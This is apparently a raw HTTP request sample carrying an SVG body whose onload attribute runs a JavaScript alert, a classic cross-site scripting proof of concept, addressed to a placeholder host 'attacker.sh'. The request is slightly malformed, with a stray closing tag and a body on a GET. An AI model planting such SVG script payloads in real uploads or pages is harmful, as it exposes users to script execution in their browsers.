```
GET / HTTP/1.1
Host: attacker.sh:3000
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Content-Type: image/svg+xml
Content-Length: 152
Connection: keep-alive

<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS executed');">
  <rect width="300" height="100" style="fill:rgb(0,0,255);" />
</svg>

</svg>
```
